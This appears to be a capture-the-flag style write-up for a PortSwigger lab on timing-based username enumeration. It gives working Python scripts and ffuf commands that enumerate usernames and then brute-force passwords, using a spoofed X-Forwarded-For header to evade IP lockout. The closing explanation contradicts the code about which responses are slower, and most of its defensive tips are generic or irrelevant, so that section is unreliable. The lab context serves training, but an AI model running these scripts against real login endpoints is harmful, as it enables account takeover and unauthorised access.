# Username enumeration with different timing

## Username enumeration with different timing using Python

```python
import time
import requests, urllib3
import sys
from string import printable

urllib3.disable_warnings()

class AuthBruteForceUsername:

    def __init__(self):
        # get command line arguments
        self.args = sys.argv
        self.proxies = {
            "https": "https://0.0.0.0:8088"
        }
        self.req = requests.Session()
        self.password = ""
        self.username = ""

    def brute_force_username(self):
        print("🔮 Determining username")
        usernames = []
        with open("auth-timing/auth-timing-usernames") as f:
            usernames = f.readlines()
        end_times = []
        for x, username in enumerate(usernames):
            print(f"Trying username: {username.strip()}❓")
            # send request with form data: username, password
            self.username = username.strip()
            self.password = ".................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................." + \
                ".............................................................."
            self.url = self.args[1]
            self.cookies = {}
            self.headers = {'X-Forwarded-For': f"hihihi{x}"}
            start_time = time.time()
            _ = self.req.post(self.url, data={"username": self.username, "password": self.password}, proxies=self.proxies, verify=False, cookies=self.cookies, headers=self.headers)
            end_time = time.time()
            duration = end_time - start_time
            print(f"Request took {duration} seconds for username {self.username}")
            end_times.append([duration, self.username])
        longest_time = 0
        for duration, username in end_times:
            if duration > longest_time:
                longest_time = duration
                self.username = username
        print(f"⚖️ Found username: {self.username}")
        with open("auth-timing-username-result", "w") as f:
            f.write(self.username)
        exit(0)

AuthBruteForceUsername().brute_force_username()
```

<a href="https://asciinema.org/a/AWR40GHGsAUGCvLmRZDLkIaY6" target="_blank"><img src="https://asciinema.org/a/AWR40GHGsAUGCvLmRZDLkIaY6.svg" /></a>



## Password brute forcing with different timing using Python

```python
import requests, urllib3
import sys
from string import printable

urllib3.disable_warnings()

class AuthBruteForcePassword:

    def __init__(self):
        # get command line arguments
        self.args = sys.argv
        self.proxies = {
            "https": "https://0.0.0.0:8088"
        }
        self.req = requests.Session()
        self.password = ""
        self.username = ""
        with open("auth-timing-username-result") as f:
            self.username = f.read().strip()

    def brute_force_password(self):
        print("🔮 Determining passwword for username", self.username)
        passwords = []
        with open("auth-timing/auth-timing-passwords") as f:
            passwords = f.readlines()
        for x, password in enumerate(passwords):
            print(f"Trying password: {password.strip()}❓")
            # send request with form data: username, password
            self.password = password.strip()
            self.url = self.args[1]
            self.cookies = {}
            self.headers = {'X-Forwarded-For': f"hihihi{x}"}
            response = self.req.post(self.url, data={"username": self.username, "password": self.password}, proxies=self.proxies, verify=False, headers=self.headers)
            if response.text and not "Invalid username or password" in response.text:
                print(f"⚖️ Found password: {self.password}")
                with open("auth-timing-password-result", "w") as f:
                    f.write(self.password)
                break
        exit(0)

AuthBruteForcePassword().brute_force_password()
```

<a href="https://asciinema.org/a/VzC6Vnzv1Hip8KPi7PbhLX5XI" target="_blank"><img src="https://asciinema.org/a/VzC6Vnzv1Hip8KPi7PbhLX5XI.svg" /></a>

## ffuf username and password enumeration with different timing

### Username

Find the way that the website is protecting against username enumeration - 
`X-Forwarded-For` header, that blocks in IP. Then use ffuf to enumerate usernames. Give it a list of usernames, and use the `-ft` flag to filter out responses that are too fast.

```shell
ffuf -X POST -replay-proxy http://0.0.0.0:8088 -u https://0aa8003304124f0c80ecc11100fe0055.web-security-academy.net/login -w auth-timing/auth-timing-usernames:FUZZ -H "X-Forwarded-For: FUZZ-1" -c -d "username=FUZZ&password=..................................................................................................................................................................................................................................................................................................................................................................................................................................................................." -c -v -r -ft "<1000"
```

### Password

Take the username from above command, and use it to brute force the password. Use the `-fs` flag to filter out responses that are mostly similar. This will give just the response that is different, which is the correct password.

```shell
ffuf -X POST -replay-proxy http://0.0.0.0:8088 -u https://0aa8003304124f0c80ecc11100fe0055.web-security-academy.net/login -H "X-Forwarded-For: FUZZ2-2" -w auth-timing/auth-timing-passwords:FUZZ2 -c -d "username=_FROM_COMMAND_ABOVE_&password=FUZZ2" -c -v -r -fs 3141,3194
```

<a href="https://asciinema.org/a/6Nhon5SPNy61jTnNJ9yN01f2F" target="_blank"><img src="https://asciinema.org/a/6Nhon5SPNy61jTnNJ9yN01f2F.svg" /></a>

Sure. The Username enumeration via response timing tutorial example in PortSwigger Academy demonstrates how a website can be vulnerable to username enumeration attacks by using timing differences in response times.

In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.

The website has a timing difference in response times for valid and invalid usernames. Specifically, the website takes longer to respond to requests with invalid usernames than with valid usernames.

This means that an attacker can use this timing difference to enumerate valid usernames. Specifically, the attacker can submit a list of usernames to the website and measure the response time for each request. If the response time is longer than a certain threshold, the attacker can infer that the username is invalid.

To exploit this vulnerability, the attacker would first need to obtain a list of possible usernames for the website. This could be done through a variety of methods, such as social engineering or dictionary attacks.

Once the attacker has a list of possible usernames, they would need to submit the list to the website and measure the response time for each request. If the response time is longer than a certain threshold, the attacker can infer that the username is invalid. The attacker can then continue to submit usernames until they find one that has a shorter response time, indicating that it is a valid username.

The Username enumeration via response timing tutorial example is a good demonstration of how a website can be vulnerable to username enumeration attacks by using timing differences in response times. It is important to be aware of these vulnerabilities and to take steps to protect yourself.

Here are some tips for protecting yourself from username enumeration attacks:

* Use a strong username for your online accounts.
* Change your usernames regularly.
* Be suspicious of emails or text messages that ask for your personal information.
* Install antivirus software and keep it up to date.
* Be careful about what websites you visit and what links you click on.
* Train yourself and your employees on how to identify and avoid phishing attacks.

By following these tips, you can help to protect yourself from username enumeration attacks and keep your accounts safe.

In addition to the tips above, there are a few things that the website can do to protect itself from username enumeration attacks:

* Use a rate limiting mechanism to prevent users from submitting too many requests in a short period of time.
* Use a honeypot account to lure attackers into entering invalid usernames.
* Implement a CAPTCHA challenge to verify that the user is human.
* Use a random delay mechanism to prevent attackers from measuring response times.

By implementing these measures, the website can help to protect itself from username enumeration attacks.